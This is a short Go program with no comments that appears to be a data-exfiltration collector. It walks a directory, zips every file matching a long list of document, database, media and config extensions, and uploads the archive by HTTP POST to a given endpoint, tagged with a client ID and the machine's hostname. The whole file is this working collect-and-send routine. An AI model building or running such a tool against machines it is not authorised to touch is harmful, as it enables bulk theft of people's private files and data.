package main

import (
	"archive/zip"
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

func uploadFile(filepath string, endpoint string, clientId string, hostId string) error {
	file, err := os.Open(filepath)
	if err != nil {
		return err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath)

	if err != nil {
		return err
	}

	_, err = io.Copy(part, file)

	err = writer.Close()
	if err != nil {
		return err
	}

	request, err := http.NewRequest("POST", endpoint, body)
	if err != nil {
		return err
	}

	request.Header.Add("Content-Type", writer.FormDataContentType())
	request.Header.Add("ClientId", clientId)
	request.Header.Add("HostId", hostId)

	client := &http.Client{}
	response, err := client.Do(request)

	if err != nil {
		return err
	} else {
		body := &bytes.Buffer{}
		_, err := body.ReadFrom(response.Body)
		if err != nil {
			return err
		}
		response.Body.Close()
		fmt.Println(body)
	}
	return nil
}

func main() {
	output := flag.String("o", "", "Output archive path")
	dir := flag.String("d", "", "Directory to search in")
	endpoint := flag.String("e", "", "http://example.com/")
	clientId := flag.String("c", "", "Client ID")
	hostId, err := os.Hostname()

	flag.Parse()

	fileTypes := []string{".pdf", ".php", ".png", ".ppt", ".psd", ".rar", ".raw", ".rtf", ".sql", ".svg", ".swf", ".tar", ".txt", ".wav", ".wma", ".wmv", ".xls", ".xml", ".yml", ".zip", ".aiff", ".aspx", ".docx", ".epub", ".json", ".mpeg", ".pptx", ".xlsx", ".yaml"}

	newZipFile, err := os.Create(*output)
	if err != nil {
		panic(err)
	}

	zipWriter := zip.NewWriter(newZipFile)

	err = filepath.Walk(*dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		ext := filepath.Ext(path)

		for _, t := range fileTypes {
			if ext == t {
				fileToZip, err := os.Open(path)
				if err != nil {
					return err
				}
				defer fileToZip.Close()

				header, err := zip.FileInfoHeader(info)
				if err != nil {
					return err
				}

				header.Name = path
				header.Method = zip.Deflate

				writer, err := zipWriter.CreateHeader(header)
				if err != nil {
					return err
				}
				_, err = io.Copy(writer, fileToZip)
				break
			}
		}

		return nil
	})

	if err != nil {
		panic(err)
	}

	err = zipWriter.Close()
	if err != nil {
		panic(err)
	}

	err = uploadFile(*output, *endpoint, *clientId, hostId)
	if err != nil {
		log.Fatalf("Error uploading file: %s", err)
	}
}
